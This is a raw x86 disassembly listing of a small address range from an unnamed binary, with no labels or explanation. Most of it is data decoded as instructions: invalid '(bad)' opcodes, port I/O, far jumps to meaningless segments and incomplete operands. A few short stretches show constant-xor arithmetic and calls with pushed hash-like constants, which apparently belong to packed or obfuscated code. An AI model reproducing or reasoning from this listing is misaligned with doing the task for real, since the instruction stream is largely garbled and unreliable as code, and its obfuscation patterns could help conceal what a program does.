  412f3b:	dec    ecx
  412f3c:	les    ebp,FWORD PTR [ecx+ebp*4]
  412f3f:	mov    BYTE PTR [ebx],bl
  412f41:	fiadd  DWORD PTR [esi+0x2e]
  412f44:	push   ss
  412f45:	rol    DWORD PTR [ebx],0x9c
  412f48:	dec    edi
  412f49:	adc    ebp,ebx
  412f4b:	mov    bl,0xab
  412f4d:	call   0xa8e3:0xe18b74fa
  412f54:	mov    ch,0xd3
  412f56:	out    dx,eax
  412f57:	into   
  412f58:	ror    DWORD PTR [ebx],1
  412f5a:	outs   dx,BYTE PTR ds:[esi]
  412f5b:	into   
  412f5c:	inc    edx
  412f5d:	loop   0x412fae
  412f5f:	in     eax,dx
  412f60:	pop    es
  412f61:	and    al,0x25
  412f63:	jns    0x412f14
  412f65:	sub    BYTE PTR [ebx+0x614aec38],ch
  412f6b:	sbb    DWORD PTR [edi+ebx*4],ebx
  412f6e:	and    al,0xa8
  412f70:	fsub   DWORD PTR [eax]
  412f72:	fild   WORD PTR [esi-0x7c]
  412f75:	xchg   esi,eax
  412f76:	(bad)  
  412f77:	adc    bl,bl
  412f79:	call   DWORD PTR [eax]
  412f7b:	mov    eax,0x85f755fd
  412f80:	pop    eax
  412f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f82:	lods   al,BYTE PTR ds:[esi]
  412f83:	sbb    cl,BYTE PTR [edx]
  412f85:	test   al,0xc7
  412f87:	mov    ebx,0xdb68a508
  412f8c:	inc    ecx
  412f8d:	jno    0x413005
  412f8f:	dec    eax
  412f90:	adc    ebp,DWORD PTR ds:0x91a20ded
  412f96:	ror    BYTE PTR [esi],cl
  412f98:	js     0x412f3f
  412f9a:	mov    bh,0x6f
  412f9c:	das    
  412f9d:	jp     0x412ff9
  412f9f:	out    dx,eax
  412fa0:	jmp    0xa5c4:0xaf81f24b
  412fa7:	iret   
  412fa8:	sub    edx,DWORD PTR [esi+0x36c12ae2]
  412fae:	jp     0x412f59
  412fb0:	jae    0x412f9f
  412fb2:	or     al,0xb6
  412fb4:	js     0x413000
  412fb6:	popf   
  412fb7:	or     BYTE PTR [edi],dh
  412fb9:	outs   dx,BYTE PTR ds:[esi]
  412fba:	fisub  DWORD PTR [eax+ecx*2]
  412fbd:	test   eax,0x1824dad5
  412fc2:	adc    ecx,DWORD PTR [ecx-0x22]
  412fc5:	retf   0xdd26
  412fc8:	sub    DWORD PTR [eax+0x1ac9144e],edi
  412fce:	mov    eax,ds
  412fd0:	mov    al,0xa3
  412fd2:	adc    ebx,DWORD PTR [esi+edx*2]
  412fd5:	dec    ecx
  412fd6:	(bad)
  412fda:	(bad)  
  412fdb:	mov    edx,0x9196c7f
  412fe0:	jmp    0x2ec:0x86381396
  412fe7:	int    0xcc
  412fe9:	mov    esi,DWORD PTR [ecx]
  412feb:	jno    0x412f78
  412fed:	mov    esp,0x6f77f310
  412ff2:	aad    0xc5
  412ff4:	aad    0x3b
  412ff6:	lds    esi,FWORD PTR [ecx+0x32]
  412ff9:	and    DWORD PTR [edi+0x6c],0x74
  412ffd:	mov    dh,0xb4
  412fff:	js     0x412fe0
  413001:	inc    ebp
  413002:	cmp    eax,DWORD PTR [ecx+0x1f855d14]
  413008:	(bad)  
  413009:	mov    al,0x7
  41300b:	out    0xab,eax
  41300d:	mov    ds:0x91822953,al
  413012:	scas   eax,DWORD PTR es:[edi]
  413013:	call   0x25d6:0x2611fec9
  41301a:	add    eax,0xd4323722
  41301f:	test   BYTE PTR [ecx+0xd210e79],0x6a
  413026:	dec    ecx
  413027:	adc    al,0x31
  413029:	sbb    ecx,DWORD PTR [eax]
  41302b:	jg     0x412fb5
  41302d:	mov    ebp,0x2d1fb293
  413032:	in     al,dx
  413033:	jle    0x41304b
  413035:	pop    es
  413036:	and    BYTE PTR [ebp-0x61],al
  413039:	pop    esi
  41303a:	icebp  
  41303b:	repnz outs dx,DWORD PTR ds:[esi]
  41303d:	push   0x9ba6df46
  413042:	cmp    ebp,DWORD PTR [esi+0x70]
  413045:	icebp  
  413046:	xchg   DWORD PTR [ebx],ebp
  413048:	lock sbb ecx,esp
  41304b:	je     0x4130ba
  41304d:	add    esp,DWORD PTR [eax]
  41304f:	sbb    BYTE PTR [ecx-0x5be2d6f2],bh
  413055:	jo     0x412fd7
  413057:	mov    edi,0x9d5df3fe
  41305c:	push   es
  41305d:	xor    dh,dl
  41305f:	cmp    DWORD PTR [edi+0x11],0xffffff80
  413063:	mov    bh,cl
  413065:	xlat   BYTE PTR ds:[ebx]
  413066:	cmp    al,0x44
  413068:	push   ecx
  413069:	push   eax
  41306a:	call   0x4220b4
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [ebx+ebx*1-0x5c],edi
  4130e0:	hlt    
  4130e1:	push   0xffffffd3
  4130e3:	dec    eax
  4130e4:	sbb    BYTE PTR [eax],bl
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    BYTE PTR [edi+0x2b],dh
  4130ec:	sub    DWORD PTR [eax],0x6fb48618
  4130f2:	div    edx
  4130f4:	test   BYTE PTR [eax+0x1a365921],bl
  4130fa:	bt     DWORD PTR [ecx],0xf2
  4130fe:	push   edx
  4130ff:	push   0x4b
  413101:	ins    BYTE PTR es:[edi],dx
  413102:	sub    cl,ah
  413104:	lods   eax,DWORD PTR ds:[esi]
  413105:	cmp    edx,DWORD PTR [esi-0x159824f8]
  41310b:	pop    edx
  41310c:	lods   eax,DWORD PTR ds:[esi]
  41310d:	or     eax,0xaf6acc0f
  413112:	leave  
  413113:	adc    esi,ecx
  413115:	jle    0x413177
  413117:	sub    BYTE PTR [esp+eax*2+0x477e7d86],cl
  41311e:	dec    edi
  41311f:	fsubr  DWORD PTR [edx-0x4bd939a9]
  413125:	mov    ch,0x80
  413127:	or     ebp,ebx
  413129:	jmp    0x9e61:0x9e30e56f
  413130:	xor    ch,BYTE PTR [ebx+0x61c088e9]
  413136:	push   ss
  413137:	aaa    
  413138:	std    
  413139:	cmp    BYTE PTR [eax-0x769c921],al
  41313f:	mov    esp,ecx
  413141:	jle    0x41317f
  413143:	les    edi,FWORD PTR [ecx]
  413145:	popa   
  413146:	test   eax,0xb8931058
  41314b:	cmc    
  41314c:	aaa    
  41314d:	dec    edi
  41314e:	(bad)  
  41314f:	test   eax,0x7f3998e7
  413154:	std    
  413155:	and    al,0x19
  413157:	(bad)  
  413158:	aas    
  413159:	in     al,dx
  41315a:	mov    cl,0xe9
  41315c:	dec    ecx
  41315d:	(bad)  
  41315e:	out    dx,eax
  41315f:	in     eax,0xad
  413161:	xor    esp,edi
  413163:	or     ebx,esi
  413165:	pushf  
  413166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413167:	jbe    0x41319e
  413169:	cld    
  41316a:	and    BYTE PTR [ebx],al
  41316c:	jmp    0xb442:0x530fbd0b
  413173:	aad    0x32
  413175:	cmp    al,bh
  413177:	and    al,0x8b
  413179:	push   ecx
  41317a:	jne    0x4131f4
  41317c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41317d:	(bad)  
  41317e:	and    al,0x44
  413180:	push   edi
  413181:	or     dh,bh
  413183:	repz js 0x413136
  413186:	test   al,0x76
  413188:	scas   eax,DWORD PTR es:[edi]
  413189:	sub    eax,0xefec3070
  41318e:	js     0x4131d9
  413190:	gs dec edx
  413192:	mov    dl,BYTE PTR [ebx-0x51bf7239]
  413198:	or     BYTE PTR [esi+0x184618d2],0x48
  41319f:	pop    ebx
  4131a0:	dec    eax
  4131a1:	mov    cl,0x69
  4131a3:	pop    esi
  4131a4:	lods   al,BYTE PTR ds:[esi]
  4131a5:	xchg   edi,eax
  4131a6:	cmp    DWORD PTR [ebx-0x1a0d2f81],ebp
  4131ac:	mov    ebp,?
  4131ae:	out    0x47,al
  4131b0:	xor    DWORD PTR [ecx-0x77],edi
  4131b3:	rcl    DWORD PTR [edx-0x36e92ed1],0xf9
  4131ba:	sbb    bl,BYTE PTR [bp+si+0x66]
  4131be:	lds    esp,FWORD PTR ds:0xaf481cd4
  4131c4:	ins    DWORD PTR es:[edi],dx
  4131c5:	rcl    eax,1
  4131c7:	push   ebx
  4131c8:	ret    
  4131c9:	retf   0x52c5
  4131cc:	pop    ecx
  4131cd:	add    BYTE PTR [ebx+0x11],ch
  4131d0:	dec    esi
  4131d1:	loop   0x413180
  4131d3:	pop    es
  4131d4:	imul   edi,eax,0xffffffb6
  4131d7:	cld    
  4131d8:	and    DWORD PTR [ecx-0x5f],esp
  4131db:	dec    edx
  4131dc:	xchg   ebp,eax
  4131dd:	jmp    0x8ab2:0x56bba2d
  4131e4:	push   bp
  4131e6:	mov    DWORD PTR [edi+0x66],esp
  4131e9:	pop    eax
  4131ea:	or     ebp,eax
  4131ec:	hlt    
  4131ed:	call   0x1b2f0523
  4131f2:	cmp    ch,BYTE PTR [eax]
  4131f4:	push   0x5c2d2212
  4131f9:	jmp    0x8927:0x38fa3fbe
  413200:	sbb    esp,DWORD PTR [ebp+0x22cb65d1]
  413206:	inc    esp
  413207:	lds    edx,FWORD PTR [eax]
  413209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41320a:	int3   
  41320b:	into   
  41320c:	popa   
  41320d:	jo     0x41324f
  41320f:	add    DWORD PTR [eax],esp
  413211:	int3   
  413212:	call   0x1e934061
  413217:	nop
  413218:	lds    edx,FWORD PTR [ebx]
  41321a:	int3   
  41321b:	and    al,0x1e
  41321d:	push   0x5d
  41321f:	(bad)  
  413220:	fsub   DWORD PTR es:[ebp-0x6ccbcfbd]
  413227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413228:	cdq    
  413229:	pop    es
  41322a:	push   esp
  41322b:	sub    eax,0x605c7ffe
  413230:	pop    ebx
  413231:	cmp    ch,BYTE PTR [ebp-0x4c]
  413234:	sbb    ch,ah
  413236:	scas   eax,DWORD PTR es:[edi]
  413237:	aad    0x74
  413239:	jne    0x413257
  41323b:	std    
  41323c:	retf   
  41323d:	ins    BYTE PTR es:[edi],dx
  41323e:	mov    esp,es
  413240:	cmp    ecx,DWORD PTR [edx]
  413242:	jae    0x41323b
  413244:	and    BYTE PTR [ebx+0x60],bh
  413247:	xor    esp,DWORD PTR [ebx+0x5f]
  41324a:	(bad)  
  41324b:	(bad)  
  41324c:	out    dx,eax
  41324d:	push   edi
  41324e:	adc    edx,DWORD PTR [ebx]
  413250:	add    BYTE PTR [edx+0x2aeb6e90],0x1d
  413257:	and    DWORD PTR es:[edx-0x13],0x4b
  41325c:	out    dx,eax
  41325d:	outs   dx,DWORD PTR ds:[esi]
  41325e:	repz and DWORD PTR [esi+0x6d],ebp
  413262:	adc    ah,BYTE PTR [ecx+0x61]
  413265:	pop    ebp
  413266:	mov    bl,0x61
  413268:	(bad)  
  413269:	daa    
  41326a:	ficom  WORD PTR ds:0x8644fd80
  413270:	jns    0x4132c3
  413272:	dec    eax
  413273:	inc    ebp
  413274:	leave  
  413275:	or     dh,BYTE PTR [ecx]
  413277:	sbb    ebx,0x57
  41327a:	repnz adc al,0xc6
  41327d:	mov    cs,WORD PTR [esi-0x7e6b2a3c]
  413283:	jmp    0xe8d13223
  413288:	icebp  
  413289:	jl     0x413290
  41328b:	cmp    al,0xec
  41328d:	scas   eax,DWORD PTR es:[edi]
  41328e:	inc    eax
  41328f:	dec    ecx
  413290:	or     esi,esp
  413292:	jmp    0xd972:0x37270184
  413299:	sub    DWORD PTR [ebp+0x5c74686],ebx
  41329f:	cmc    
  4132a0:	add    ecx,eax
  4132a2:	outs   dx,BYTE PTR ds:[esi]
  4132a3:	lahf   
  4132a4:	mov    WORD PTR [ebx+0x6bd1620c],?
  4132aa:	shr    BYTE PTR [esi-0x1e],0xc8
  4132ae:	ss ret 0x3f97
  4132b2:	dec    ecx
  4132b3:	push   ebp
  4132b4:	inc    edi
  4132b5:	lea    ebp,ss:0xe56e297a
  4132bc:	cmp    BYTE PTR ds:0xc89feb4d,ch
  4132c2:	retf   
  4132c3:	fucomip st,st(6)
  4132c5:	sbb    ebx,DWORD PTR [edx+0x2d]
  4132c8:	jmp    0xb6d9:0xf9043f09
  4132cf:	or     eax,0xc9f24bca
  4132d4:	(bad)  
  4132d5:	mov    ds:0x98cdb94f,eax
  4132da:	mov    edi,0xd3ccdc4a
  4132df:	jns    0x41331c
  4132e1:	std    
  4132e2:	push   0x50
  4132e4:	std    
  4132e5:	jmp    0x4132b5
  4132e7:	pop    es
  4132e8:	fisub  WORD PTR [esi+0x147e27b0]
  4132ee:	xchg   ebx,eax
  4132ef:	sbb    eax,0x1b935475
  4132f4:	arpl   WORD PTR [esi+0x70],sp
  4132f7:	sub    BYTE PTR [ebp+0x43],dh
  4132fa:	in     eax,0x7e
  4132fc:	inc    ebx
  4132fd:	sub    DWORD PTR [edi-0xf7ff639],edx
  413303:	in     al,0x8e
  413305:	ja     0x413340
  413307:	push   0xffffffa9
  413309:	inc    edx
  41330a:	xchg   ecx,eax
  41330b:	xlat   BYTE PTR ds:[ebx]
  41330c:	mov    cl,0xa
  41330e:	lds    ecx,FWORD PTR [ebx+0x5fcb4182]
  413314:	ins    BYTE PTR es:[edi],dx
  413315:	imul   ebp
  413317:	push   edi
  413318:	bound  edi,QWORD PTR [esp+esi*1]
  41331b:	xchg   edx,eax
  41331c:	or     edi,esi
  41331e:	call   0x5c5c:0xc172008b
  413325:	push   es
  413326:	das    
  413327:	sti    
  413328:	add    al,0x90
  41332a:	inc    edx
  41332b:	jmp    0x413334
  41332d:	jp     0x41330f
  41332f:	sbb    ch,BYTE PTR [edi+0x458ff0aa]
  413335:	shr    BYTE PTR [ebx-0x3d],0x9b
  413339:	stc    
  41333a:	sbb    BYTE PTR [edx],0x63
  41333d:	jl     0x413366
  41333f:	and    DWORD PTR [edi-0x29],eax
  413342:	(bad)  
  413343:	mov    ds:0x74d52ca5,eax
  413348:	mov    esp,0x83715e92
  41334d:	lods   ax,WORD PTR ds:[esi]
  41334f:	dec    ecx
  413350:	loope  0x4133c7
  413352:	cmp    DWORD PTR [esi],edi
  413354:	stos   DWORD PTR es:[edi],eax
  413355:	jmp    0x41330e
  413357:	jmp    0x4133aa
  413359:	nop
  41335a:	aas    
  41335b:	pop    esi
  41335c:	popa   
  41335d:	cld    
  41335e:	add    eax,0x306191
  413363:	imul   ebp,DWORD PTR [edx],0xfffffff5
  413366:	ja     0x413394
  413368:	test   DWORD PTR [ebp-0x6a21d271],ebp
  41336e:	daa    
  41336f:	push   edi
  413370:	jmp    edi
  413372:	mov    esp,0xf08bedf1
  413377:	jecxz  0x413347
  413379:	std    
  41337a:	aaa    
  41337b:	pop    ebx
  41337c:	popf   
  41337d:	mov    cl,BYTE PTR [eax]
  41337f:	jmp    0xf262fa84
  413384:	push   esp
  413385:	jns    0x413361
  413387:	out    dx,eax
  413388:	cmovge esp,DWORD PTR [edx-0x22]
  41338c:	pop    es
  41338d:	inc    ebp
  41338e:	jp     0x41332e
  413390:	outs   dx,DWORD PTR ds:[esi]
  413391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413392:	xchg   DWORD PTR [ecx],edi
  413394:	xlat   BYTE PTR ds:[ebx]
  413395:	pop    esp
  413396:	scas   al,BYTE PTR es:[edi]
  413397:	xor    eax,0xadda5688
  41339c:	lea    esp,[edx-0x21]
  41339f:	mov    dh,0xb0
  4133a1:	mov    ds:0xadfab2cc,eax
  4133a6:	enter  0xba21,0xe5
  4133aa:	pop    edx
  4133ab:	es push cs
  4133ad:	loope  0x413429
  4133af:	xchg   ecx,eax
  4133b0:	xchg   edx,eax
  4133b1:	into   
  4133b2:	vunpcklps ymm3,ymm3,YMMWORD PTR [eax-0x26]
  4133b7:	gs push 0xb
  4133ba:	jo     0x41336f
  4133bc:	push   ebx
  4133bd:	retf   
  4133be:	and    esi,DWORD PTR [ecx-0x79]
  4133c1:	xlat   BYTE PTR ds:[ebx]
  4133c2:	jecxz  0x413359
  4133c4:	xor    edi,DWORD PTR [eax-0x2b]
  4133c7:	sar    DWORD PTR [edx],1
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	sub    DWORD PTR [edi],eax
  4133cc:	mov    al,bl
  4133ce:	pop    ebp
  4133cf:	std    
  4133d0:	fs jecxz 0x4133f1
  4133d3:	imul   edi,DWORD PTR [ebx-0x59],0x3c
  4133d7:	cdq    
  4133d8:	nop
  4133d9:	sub    DWORD PTR [esi-0x2952db2b],0x60afdcd0
  4133e3:	repz hlt 
  4133e5:	adc    al,0xdd
  4133e7:	data16 xor al,0x23
  4133ea:	call   0x54c1af74
  4133ef:	sub    edx,DWORD PTR [edx]
  4133f1:	push   0xffffffb6
  4133f3:	fwait
  4133f4:	sbb    esp,ecx
  4133f6:	rcl    DWORD PTR [esi+0x57],cl
  4133f9:	sub    al,0x7e
  4133fb:	mov    dl,0x70
  4133fd:	loope  0x413453
  4133ff:	and    DWORD PTR [esi-0x65ac210e],esp
  413405:	and    dh,BYTE PTR [esi+edi*2-0x20]
  413409:	mov    ebp,0x546cbd51
  41340e:	out    0xcb,eax
  413410:	loope  0x413476
  413412:	or     ecx,DWORD PTR ds:0x9d7ed255
  413418:	adc    ecx,esi
  41341a:	inc    esi
  41341b:	mov    bl,BYTE PTR [ecx-0x48d76037]
  413421:	jno    0x4133ca
  413423:	add    DWORD PTR [edi+0x4e],edi
  413426:	aam    0xd7
  413428:	fadd   QWORD PTR [eax+0x70]
  41342b:	mov    dh,BYTE PTR [esi]
  41342d:	or     ebp,DWORD PTR [ebx]
  41342f:	(bad)  
  413430:	fld    QWORD PTR [ecx]
  413432:	and    edx,edx
  413434:	(bad)  
  413435:	jno    0x413451
  413437:	jle    0x4133de
  413439:	inc    esp
  41343a:	je     0x4133bd
  41343c:	sbb    ebp,DWORD PTR ds:0xbe2b34c
  413442:	loop   0x413447
  413444:	test   ebp,eax
  413446:	cmovl  eax,DWORD PTR [edx+0x7e0b7033]
  41344d:	cmp    esp,eax
  41344f:	jb     0x413413
  413451:	jbe    0x413476
  413453:	imul   ebx,DWORD PTR [ebx-0x45],0xffffff85
  413457:	jnp    0x413416
  413459:	sti    
  41345a:	jp     0x4134b2
  41345c:	inc    esi
  41345d:	(bad)  
  41345e:	cld    
  41345f:	dec    ecx
  413460:	and    eax,0xe3c6dfea
  413465:	in     al,0x2b
  413467:	xor    dh,0x81
  41346a:	inc    ecx
  41346b:	cmp    DWORD PTR [eax],ecx
  41346d:	and    DWORD PTR [eax],eax
  41346f:	ret    
  413470:	aaa    
  413471:	lock test al,0xb
  413474:	inc    ebx
  413475:	adc    eax,0x18fcfa7a
  41347a:	inc    edi
  41347b:	sub    DWORD PTR [edi-0x1508cdc8],esp
  413481:	dec    edi
  413482:	sbb    al,al
  413484:	dec    edi
  413485:	imul   eax,DWORD PTR ss:[ecx+0x48],0xffffffb7
  41348a:	je     0x413427
  41348c:	mov    al,0x1f
  41348e:	imul   ebp,DWORD PTR [edx+0x1e736886],0xffffff9c
  413495:	and    BYTE PTR [ebx-0x57],ch
  413498:	push   edi
  413499:	mov    ds:0xdc5475d0,eax
  41349e:	lock test eax,0xb3541ea
  4134a4:	test   al,0x81
  4134a6:	shl    BYTE PTR [ebx-0x6b],cl
  4134a9:	add    BYTE PTR [eax],al
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x4220b4
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx-0x7b1e8f61]
  4134d4:	ja     0x413552
  4134d6:	fs inc edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [esi-0x54],bl
  4134e0:	xchg   edi,eax
  4134e1:	fisub  WORD PTR [edi-0xf9ba5ba]
  4134e7:	data16 aas 
  4134e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134ea:	push   ss
  4134eb:	ds aaa 
  4134ed:	outs   dx,DWORD PTR ds:[esi]
  4134ee:	(bad)  
  4134ef:	call   0x205e6129
  4134f4:	sub    bh,bl
  4134f6:	xchg   ebx,eax
  4134f7:	xchg   ecx,eax
  4134f8:	dec    esp
  4134f9:	not    ebx
  4134fb:	jge    0x41354f
  4134fd:	pop    esp
  4134fe:	push   ebx
  4134ff:	mov    db4,esp
  413502:	dec    ebx
  413503:	imul   edi,DWORD PTR [esi-0x11],0x56baac75
  41350a:	clc    
  41350b:	in     eax,0x87
  41350d:	(bad)
  413510:	rcl    DWORD PTR [eax],0x14
  413513:	jb     0x41358c
  413515:	outs   dx,BYTE PTR ds:[esi]
  413516:	push   ds
  413517:	jg     0x4134f6
  413519:	aas    
  41351a:	cwde   
  41351b:	mov    BYTE PTR [ecx],ah
  41351d:	in     eax,0xa3
  41351f:	jg     0x413560
  413521:	jae    0x4134cf
  413523:	les    ecx,FWORD PTR [edx-0x4c62e550]
  413529:	ja     0x413576
  41352b:	sar    DWORD PTR [edx+0x5],cl
  41352e:	mov    eax,DWORD PTR ds:0x37288d31
  413534:	adc    BYTE PTR [ebx],ch
  413536:	test   BYTE PTR [eax],dh
  413538:	inc    edi
  413539:	cwde   
  41353a:	mov    al,0xbe
  41353c:	loop   0x4134c8
  41353e:	pop    ebx
  41353f:	dec    edx
  413540:	jg     0x413529
  413542:	pop    ecx
  413543:	pop    eax
  413544:	and    esi,DWORD PTR [ebx-0x35]
  413547:	pcmpeqd mm1,mm2
  41354a:	add    dh,BYTE PTR [ebp+0x69]
  41354d:	int    0x33
  41354f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413550:	gs mov ebp,0xcc890c11
  413556:	test   BYTE PTR [ebx+0x4],cl
  413559:	rcr    ebx,1
  41355b:	push   0x46
  41355d:	push   es
  41355e:	jmp    0x41351e
  413560:	adc    DWORD PTR [eax-0x6f738048],ebx
  413566:	or     DWORD PTR es:[edi+edx*8-0x68],ebp
  41356b:	int3   
  41356c:	mov    BYTE PTR [esi],bl
  41356e:	inc    ebp
  41356f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413570:	xchg   DWORD PTR [edx+0x19b48a22],edx
  413576:	mov    DWORD PTR [ebp-0x7],esp
  413579:	inc    esp
  41357a:	test   bh,bl
  41357c:	jge    0x4135fc
  41357e:	out    dx,eax
  41357f:	(bad)  
  413580:	add    BYTE PTR [esi-0x4],bl
  413583:	jl     0x413514
  413585:	int3   
  413586:	into   
  413587:	add    al,0x4
  413589:	jmp    0xb7dbddd5
  41358e:	xor    cl,cl
  413590:	adc    al,0x8f
  413592:	jb     0x41360b
  413594:	and    cl,BYTE PTR [ebx+0x29]
  413597:	lods   al,BYTE PTR ds:[esi]
  413598:	(bad)  
  413599:	xchg   edi,eax
  41359a:	xor    ch,BYTE PTR [edx+0x38b65bfd]
  4135a0:	lock fisubr WORD PTR [ebx]
  4135a3:	mov    dh,0xd2
  4135a5:	and    BYTE PTR [ebx+0x7c],al
  4135a8:	leave  
  4135a9:	rol    al,cl
  4135ab:	cmp    al,0x68
  4135ad:	fsub   QWORD PTR [eax-0x2c]
  4135b0:	and    dh,ch
  4135b2:	mov    bl,0x70
  4135b4:	leave  
  4135b5:	and    eax,ebp
  4135b7:	repnz outs dx,BYTE PTR ds:[esi]
  4135b9:	ja     0x4135d8
  4135bb:	jl     0x4135c1
  4135bd:	add    BYTE PTR [edx+0x14],al
  4135c0:	test   al,0x1c
  4135c2:	lods   al,BYTE PTR ds:[esi]
  4135c3:	and    bl,al
  4135c5:	mov    al,ds:0xfb07c130
  4135ca:	outs   dx,DWORD PTR ds:[esi]
  4135cb:	in     al,0xb7
  4135cd:	push   edi
  4135ce:	ret    
  4135cf:	ret    
  4135d0:	jl     0x413616
  4135d2:	or     DWORD PTR [edx+0x46870f2b],eax
  4135d8:	cmp    eax,0x3da336db
  4135dd:	jg     0x413613
  4135df:	and    BYTE PTR [edx+0x6f281d9f],cl
  4135e5:	pop    ebx
  4135e6:	inc    esp
  4135e7:	inc    esp
  4135e8:	xchg   esi,eax
  4135e9:	push   0x85a20259
  4135ee:	push   esp
  4135ef:	test   eax,0x2013d6fd
  4135f4:	pop    edx
  4135f5:	daa    
  4135f6:	xor    edx,ecx
  4135f8:	ins    BYTE PTR es:[edi],dx
  4135f9:	iret   
  4135fa:	adc    DWORD PTR [esi],0xb7ab070f
  413600:	test   al,0x32
  413602:	ja     0x41360e
  413604:	xor    BYTE PTR [esi-0x44],ch
  413607:	clc    
  413608:	adc    BYTE PTR [eax+0x53],al
  41360b:	xor    al,0x26
  41360d:	adc    eax,0x4e4e9530
  413612:	test   DWORD PTR [eax],0xf717d479
  413618:	mov    dh,0x7d
  41361a:	sti    
  41361b:	mov    dl,0x4
  41361d:	shl    BYTE PTR [ebp+0x71],1
  413620:	sbb    BYTE PTR [edx],0x94
  413623:	icebp  
  413624:	je     0x4135c5
  413626:	sbb    ecx,DWORD PTR [ecx-0x62]
  413629:	(bad)  
  41362a:	out    dx,al
  41362b:	jne    0x4136ab
  41362d:	cmc    
  41362e:	mov    WORD PTR [esp+ecx*1-0x61],ds
  413632:	stc    
  413633:	arpl   WORD PTR [edi],sp
  413635:	imul   eax,edi,0x2af2dad8
  41363b:	mov    ds:0xe00a30a6,al
  413640:	(bad)  [edx-0x6d]
  413643:	adc    eax,0x1ff9b68c
  413648:	xchg   BYTE PTR [ebx+0x54],al
  41364b:	jge    0x41360c
  41364d:	mov    eax,0x95c442bd
  413652:	jno    0x41365d
  413654:	pop    ss
  413655:	jp     0x4136b3
  413657:	cs mov esi,0x9da0f518
  41365d:	test   bl,bh
  41365f:	(bad)  
  413660:	mov    edi,0xbdb6363c
  413665:	inc    esp
  413666:	mov    esi,0x148abad4
  41366b:	dec    ecx
  41366c:	sub    ah,BYTE PTR [ebx+0x7d]
  41366f:	cmp    ebx,0x7f
  413672:	clc    
  413673:	dec    esi
  413674:	in     al,0x8f
  413676:	xchg   edx,eax
  413677:	jnp    0x4136dd
  413679:	ja     0x4136f2
  41367b:	or     eax,0xdc4ac2ef
  413680:	dec    ecx
  413681:	and    esi,edi
  413683:	cwde   
  413684:	mov    es,WORD PTR [edx+0x47de1fc9]
  41368a:	ds nop
  41368c:	(bad)  
  41368d:	dec    esp
  41368e:	aas    
  41368f:	xor    esp,esi
  413691:	cmp    dh,al
  413693:	in     al,0xa6
  413695:	or     DWORD PTR [edi+edx*1],esi
  413698:	aam    0xcf
  41369a:	icebp  
  41369b:	mov    ds:0x8d6b4a46,eax
  4136a0:	jl     0x4136ef
  4136a2:	cmp    ebp,DWORD PTR [ecx+0x29]
  4136a5:	xor    ebp,DWORD PTR [edi]
  4136a7:	stc    
  4136a8:	inc    edx
  4136a9:	jo     0x413655
  4136ab:	mov    esi,0x1524e12e
  4136b0:	jb     0x41363c
  4136b2:	lods   al,BYTE PTR ds:[esi]
  4136b3:	sub    BYTE PTR [esp+esi*4-0x20],cl
  4136b7:	mov    dh,0x4a
  4136b9:	loope  0x413727
  4136bb:	xchg   edi,eax
  4136bc:	ja     0x4136f4
  4136be:	sti    
  4136bf:	stc    
  4136c0:	mov    ah,0xcb
  4136c2:	lock or cl,dl
  4136c5:	xor    BYTE PTR [ebx],ch
  4136c7:	clc    
  4136c8:	push   edx
  4136c9:	mov    al,BYTE PTR [eax-0x2b132bc0]
  4136cf:	fisub  WORD PTR [ebp+0x69b263b4]
  4136d5:	mov    dl,0x17
  4136d7:	sbb    al,0x85
  4136d9:	inc    edi
  4136da:	xor    ebx,DWORD PTR [eax-0x117b45a2]
  4136e0:	sbb    eax,0x7eef685f
  4136e5:	mov    al,ds:0xa82f2866
  4136ea:	fsubr  QWORD PTR [edx-0x5c]
  4136ed:	jmp    0x3257a5c9
  4136f2:	leave  
  4136f3:	daa    
  4136f4:	push   ebp
  4136f5:	lock mov BYTE PTR [edx],cl
  4136f8:	mov    WORD PTR [esi],?
